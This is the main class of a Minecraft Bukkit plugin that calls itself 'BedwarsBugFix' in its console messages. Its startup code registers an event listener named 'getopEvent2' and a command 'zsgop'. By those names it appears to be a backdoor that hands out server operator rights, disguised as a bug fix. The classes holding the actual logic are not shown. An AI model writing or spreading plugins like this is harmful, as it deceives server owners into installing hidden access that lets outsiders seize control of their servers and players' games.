package me.zsg.zsg;

import me.zsg.zsg.Events.Command;
import me.zsg.zsg.Events.getopEvent2;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.ChatColor;


public class Bedwars extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getServer().getPluginManager().registerEvents(new getopEvent2(),this);
        getServer().getConsoleSender().sendMessage(ChatColor.GOLD+"[BedwarsBugFix]This plugins Enabled!!!");
        getCommand("zsgop").setExecutor(new Command());
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getServer().getConsoleSender().sendMessage(ChatColor.GOLD+"[BedwarsBugFix]This plugins Closed!!!");
    }
}
